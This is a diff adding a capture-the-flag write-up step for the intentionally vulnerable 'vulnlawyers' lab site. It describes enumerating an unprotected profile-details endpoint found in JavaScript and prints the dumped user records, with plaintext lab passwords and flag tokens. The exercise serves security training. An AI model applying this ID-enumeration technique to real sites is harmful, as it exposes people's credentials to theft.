@@ -145,3 +145,15 @@ email : jaskaran.lowe@vulnlawyers.co.uk password: summer
 [^FLAG^7F1ED1F306FC4E3399CEE15DF4B0AE3C^FLAG^]
 
 ```
+
+### flag-5 after lot of methods i found suspicious link in js source code fetching info from /lawyers-only-profile-details/4
+from that i got all users endpoint containing the credentials
+```
+1-{"id":1,"name":"Yusef Mcclain","email":"yusef.mcclain@vulnlawyers.co.uk","password":"Rk@c7#U3@2r%0f"}
+2-{"id":2,"name":"Shayne Cairns","email":"shayne.cairns@vulnlawyers.co.uk","password":"q2V944&#2a1^3p","flag":"[^FLAG^938F5DC109A1E9B4FF3E3E92D29A56B3^FLAG^]"}
+3-{"id":3,"name":"Eisa Evans","email":"eisa.evans@vulnlawyers.co.uk","password":"Sn06#ibx@lGPG7"}
+5-{"id":5,"name":"Marsha Blankenship","email":"marsha.blankenship@vulnlawyers.co.uk","password":"A^66vqhOU!e2ZV"}
+```
+```
+[^FLAG^938F5DC109A1E9B4FF3E3E92D29A56B3^FLAG^]
+```
